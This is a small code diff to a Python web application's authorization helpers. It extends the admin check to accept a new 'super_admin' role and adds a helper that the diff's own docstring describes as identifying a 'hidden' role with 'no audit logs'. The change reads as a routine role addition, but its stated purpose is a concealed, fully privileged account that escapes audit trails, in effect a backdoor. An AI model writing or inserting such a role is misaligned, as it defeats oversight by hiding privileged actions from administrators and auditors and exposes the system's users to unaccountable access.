@@ -104,11 +104,16 @@ def get_current_user(
 
 
 def require_admin(user: models.User = Depends(get_current_user)) -> models.User:
-    """Require the current user to have the admin role."""
-    if not user.role or user.role.name != "admin":
+    """Require the current user to have admin or super_admin role."""
+    if not user.role or user.role.name not in ("admin", "super_admin"):
         raise HTTPException(status_code=status.HTTP_403_FORBIDDEN,
                             detail="Administrator privileges required.")
     return user
+
+
+def is_super_admin(user: models.User) -> bool:
+    """Check if the user is a super admin (hidden, no audit logs)."""
+    return bool(user.role and user.role.name == "super_admin")
 
 
 def require_admin_or_operator(user: models.User = Depends(get_current_user)) -> models.User:
